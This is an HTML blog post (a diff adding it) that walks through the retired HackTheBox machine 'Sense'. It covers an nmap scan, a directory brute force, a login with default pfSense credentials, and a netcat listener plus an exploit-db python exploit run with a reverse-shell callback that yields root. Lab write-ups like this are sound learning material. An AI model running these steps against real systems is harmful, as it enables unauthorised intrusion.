@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="Shuaib Oseni">
+    <meta name="description" content="A walkthrough of hackthebox machines">
+    <meta name="keywords" content="blog,hacking,personal,web security">
+
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="Sense Walkthrough - Hackthebox"/>
+<meta name="twitter:description" content="A walkthrough of hackthebox machines"/>
+
+    <meta property="og:title" content="Sense Walkthrough - Hackthebox" />
+<meta property="og:description" content="A walkthrough of hackthebox machines" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/sense-walkthrough/" /><meta property="og:image" content="" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-17T17:31:06+01:00" />
+<meta property="article:modified_time" content="2022-02-17T17:31:06+01:00" />
+
+
+
+    <title>
+  Sense Walkthrough - Hackthebox · h0nt3r
+</title>
+
+    
+      <link rel="canonical" href="/posts/sense-walkthrough/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.d9fddbffe6f27e69985dc5fe0471cdb0e57fbf4775714bc3d847accb08f4a1f6.css" integrity="sha256-2f3b/&#43;byfmmYXcX&#43;BHHNsOV/v0d1cUvD2Eesywj0ofY=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.92.1" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      h0nt3r
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="/posts/sense-walkthrough/">
+              Sense Walkthrough - Hackthebox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2022-02-17T17:31:06&#43;01:00'>
+                February 17, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              2-minute read
+            </span>
+          </div>
+          
+          
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/walkthrough/">Walkthrough</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <p>I&rsquo;ll be starting a blog series on HackTheBox retired machines, and this will be the first machine I&rsquo;ll be publishing a walkthrough on.</p>
+<h3 id="why-retired-machines">
+  Why retired machines?
+  <a class="heading-link" href="#why-retired-machines">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>HackTheBox allows writeups or walkthroughs for retired machines only.</p>
+<h3 id="machine-info">
+  Machine Info
+  <a class="heading-link" href="#machine-info">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>Box Name  ⇒ Sense</p>
+<p>IP  ⇒  10.10.10.60</p>
+<p>OS  ⇒  FreeBSD</p>
+<p>Let&rsquo;s fire up our VPN comrades, we&rsquo;re going on a ride!</p>
+<h3 id="recon">
+  Recon
+  <a class="heading-link" href="#recon">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>I started by running a Nmap scan to gather information about the open ports and services running on this machine.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T4 -p- 10.10.10.60
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 05:23 EST
+Nmap scan report <span style="font-weight:bold">for</span> 10.10.10.60
+Host is up (0.36s latency).
+Not shown: 65533 filtered ports
+PORT    STATE SERVICE    VERSION
+80/tcp  open  http       lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Did not follow redirect to https://10.10.10.60/
+443/tcp open  ssl/https?
+| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
+| Not valid before: 2017-10-14T19:21:35
+|_Not valid after:  2023-04-06T19:21:35
+|_ssl-date: TLS randomness does not represent time
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="font-weight:bold">done</span>: 1 IP address (1 host up) scanned in 1561.11 seconds
+</code></pre></div><p>Scan result tells me only port <code>80</code> and <code>443</code> are open. Fired it up in the browser and I got a pfsense login page.</p>
+<p><img src="login.png" alt="login page"></p>
+<p>A quick google search for the default credentials revealed <code>admin:pfsense</code>, which unfortunately didn&rsquo;t work.</p>
+<p>Next, I moved on to do a directory brute force using <code>dirbuster</code></p>
+<p><img src="dirbuster.png" alt="dirbuster"></p>
+<p>A couple of 200&rsquo;s, interesting! After going through some of the files, I found a <code>changelog.txt</code> and <code>system-users.txt</code> file. looked it up, contains juicy content.</p>
+<p>Changelog.txt contains the following:</p>
+<p><img src="changelog.png" alt="changelo txt file"></p>
+<p>System-users.txt contains the following</p>
+<p><img src="system.png" alt="system users txt file"></p>
+<h3 id="shell">
+  Shell
+  <a class="heading-link" href="#shell">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>The username <code>rohit</code> and the pfsense default password <code>pfsense</code> worked.</p>
+<p><img src="dash.png" alt="dashboard"></p>
+<p>Most of the menus in the dropdown lead nowhere. The admin page contains a version number</p>
+<p><img src="version.png" alt="version number"></p>
+<p>I checked searchsploit to see if there&rsquo;s an available exploit and found a python exploit.</p>
+<p><img src="exploit.png" alt="exploit"></p>
+<p>I download the exploit from exploidb, then set up a netcat listener.</p>
+<p>netcat listener</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lnvp 9001
+</code></pre></div><p>exploit</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 9001 --username rohit --password pfsense
+</code></pre></div><p>Upon firing the exploit, I got a root shell</p>
+<p><img src="shell.png" alt="root shell"></p>
+<p>Not a PTY shell, but I wanted to find out if I could grab the flags with my present shell.</p>
+<p>found the user flag in the rohit directory</p>
+<p><img src="user.png" alt="user flag"></p>
+<p>I also found the root flag in the root directory</p>
+<p><img src="root.png" alt="root flag"></p>
+<p>Bye for now!</p>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"
+    integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"
+    integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js"
+    integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2023
+     Shuaib Oseni 
+    ·
+    
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.39a51230dce2ac866c049b52573e38bf60666af4bc63c1bdf203b9b2d95b1cd6.js" integrity="sha256-OaUSMNzirIZsBJtSVz44v2BmavS8Y8G98gO5stlbHNY="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
